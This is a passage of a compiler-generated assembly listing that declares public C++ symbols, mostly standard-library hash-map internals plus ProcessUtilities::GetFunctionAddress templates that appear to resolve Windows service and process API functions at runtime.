PUBLIC	??$addressof@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@YAPEAV?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@0@AEAV10@@Z ; std::addressof<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >
PUBLIC	??$_Freenode0@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@PEAU01@@Z ; std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *>::_Freenode0<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >
PUBLIC	??$_Free_non_head@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@PEAU01@@Z ; std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *>::_Free_non_head<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >
PUBLIC	??$?0AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@$0A@@?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEAA@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@1@@Z ; std::_Hash_vec<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >::_Hash_vec<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > ><std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > const &,0>
PUBLIC	??$_Destroy_range@PEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@PEAV12@@std@@YAXPEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@0@QEAV10@@Z ; std::_Destroy_range<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > *,std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > *>
PUBLIC	??$addressof@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@YAPEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@0@AEAU10@@Z ; std::addressof<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >
PUBLIC	??$move@AEAV?$allocator@D@std@@@std@@YA$$QEAV?$allocator@D@0@AEAV10@@Z ; std::move<std::allocator<char> &>
PUBLIC	??$_Traits_find@U?$char_traits@D@std@@@std@@YA_KQEBD_K101@Z ; std::_Traits_find<std::char_traits<char> >
PUBLIC	??$_Get_size_of_n@$07@std@@YA_K_K@Z		; std::_Get_size_of_n<8>
PUBLIC	??$_Find_last@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEBA?AU?$_Hash_find_last_result@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@_K@Z ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Find_last<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >
PUBLIC	??$GetFunctionAddress@P6AHPEAUSC_HANDLE__@@KPEB_W@Z@ProcessUtilities@@YAP6AHPEAUSC_HANDLE__@@KPEB_W@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ; ProcessUtilities::GetFunctionAddress<int (__cdecl*)(SC_HANDLE__ *,unsigned long,wchar_t const *)>
PUBLIC	??$GetFunctionAddress@P6AHPEAUSC_HANDLE__@@W4_SC_STATUS_TYPE@@PEAEKPEAK@Z@ProcessUtilities@@YAP6AHPEAUSC_HANDLE__@@W4_SC_STATUS_TYPE@@PEAEKPEAK@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ; ProcessUtilities::GetFunctionAddress<int (__cdecl*)(SC_HANDLE__ *,enum _SC_STATUS_TYPE,unsigned char *,unsigned long,unsigned long *)>
PUBLIC	??$GetFunctionAddress@P6APEAUSC_HANDLE__@@PEB_W0K@Z@ProcessUtilities@@YAP6APEAUSC_HANDLE__@@PEB_W0K@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ; ProcessUtilities::GetFunctionAddress<SC_HANDLE__ * (__cdecl*)(wchar_t const *,wchar_t const *,unsigned long)>
PUBLIC	??$GetFunctionAddress@P6APEAUSC_HANDLE__@@PEAU1@PEBDK@Z@ProcessUtilities@@YAP6APEAUSC_HANDLE__@@PEAU1@PEBDK@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ; ProcessUtilities::GetFunctionAddress<SC_HANDLE__ * (__cdecl*)(SC_HANDLE__ *,char const *,unsigned long)>
PUBLIC	??$GetFunctionAddress@P6AHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@ProcessUtilities@@YAP6AHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ; ProcessUtilities::GetFunctionAddress<int (__cdecl*)(void *,unsigned long,wchar_t const *,wchar_t *,unsigned long,void *,wchar_t const *,_STARTUPINFOW *,_PROCESS_INFORMATION *)>
PUBLIC	??$GetFunctionAddress@P6AHPEAXPEAUtagPROCESSENTRY32W@@@Z@ProcessUtilities@@YAP6AHPEAXPEAUtagPROCESSENTRY32W@@@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ; ProcessUtilities::GetFunctionAddress<int (__cdecl*)(void *,tagPROCESSENTRY32W *)>
PUBLIC	??$GetFunctionAddress@P6APEAXKK@Z@ProcessUtilities@@YAP6APEAXKK@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ; ProcessUtilities::GetFunctionAddress<void * (__cdecl*)(unsigned long,unsigned long)>
PUBLIC	??$GetFunctionAddress@P6AHPEAX@Z@ProcessUtilities@@YAP6AHPEAX@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ; ProcessUtilities::GetFunctionAddress<int (__cdecl*)(void *)>
PUBLIC	??$?RV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@QEBA_KAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z ; std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >::operator()<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >
PUBLIC	??$_Erase@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@AEAA_KAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Erase<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >
PUBLIC	??$insert@U?$pair@PEBDPEAUHINSTANCE__@@@std@@$0A@@?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA?AU?$pair@V?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@_N@1@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@1@@Z ; std::unordered_map<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::insert<std::pair<char const *,HINSTANCE__ *>,0>
PUBLIC	??$?0PEBDAEAPEAUHINSTANCE__@@$0A@@?$pair@PEBDPEAUHINSTANCE__@@@std@@QEAA@$$QEAPEBDAEAPEAUHINSTANCE__@@@Z ; std::pair<char const *,HINSTANCE__ *>::pair<char const *,HINSTANCE__ *><char const *,HINSTANCE__ * &,0>
PUBLIC	??$find@X@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA?AV?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::find<void>
PUBLIC	??$count@X@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEBA_KAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::count<void>
PUBLIC	??$_To_address@PEAPEBD@std@@YA?A_PAEBQEAPEBD@Z	; std::_To_address<char const * *>
PUBLIC	??$_Copy_memmove@PEBQEBDPEAPEBD@std@@YAPEAPEBDPEBQEBD0PEAPEBD@Z ; std::_Copy_memmove<char const * const *,char const * *>
PUBLIC	??$to_address@QEBD@std@@YAPEBQEBDQEBQEBD@Z	; std::to_address<char const * const>
PUBLIC	?allocate@?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@QEAAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@_K@Z ; std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> >::allocate
PUBLIC	?_Get_max_bucket_size@?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@QEAAAEAMXZ ; std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >::_Get_max_bucket_size
PUBLIC	?_Alloc_sentinel_and_proxy@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@AEAAXXZ ; std::list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::_Alloc_sentinel_and_proxy
PUBLIC	?_Get_first@?$_Compressed_pair@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@2@$00@std@@QEAAAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@2@XZ ; std::_Compressed_pair<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> >,std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >,1>::_Get_first
PUBLIC	?allocate@?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@QEAAPEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@_K@Z ; std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > >::allocate
PUBLIC	?size@?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEBA_KXZ ; std::_Hash_vec<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >::size
PUBLIC	?_Swap_proxy_and_iterators@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXAEAV12@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Swap_proxy_and_iterators
PUBLIC	??0?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@QEAA@AEBV?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@1@@Z ; std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0>::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0>
PUBLIC	??0?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@1@@Z ; std::list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >
PUBLIC	?_Getal@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@AEAAAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@2@XZ ; std::list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::_Getal
PUBLIC	?_Max_bucket_size@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEAAAEAMXZ ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Max_bucket_size
PUBLIC	?deallocate@?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@QEAAXQEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@_K@Z ; std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > >::deallocate
PUBLIC	?capacity@?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEBA_KXZ ; std::_Hash_vec<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >::capacity
PUBLIC	?_Assign_grow@?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEAAX_KV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@@Z ; std::_Hash_vec<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >::_Assign_grow
PUBLIC	?_Get_first@?$_Compressed_pair@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@V?$_Vector_val@U?$_Simple_types@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@2@$00@std@@QEAAAEAV?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@2@XZ ; std::_Compressed_pair<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > >,std::_Vector_val<std::_Simple_types<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >,1>::_Get_first
PUBLIC	??0?$_List_unchecked_const_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@U_Iterator_base0@2@@std@@QEAA@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@1@PEBV?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@1@@Z ; std::_List_unchecked_const_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >,std::_Iterator_base0>::_List_unchecked_const_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >,std::_Iterator_base0>
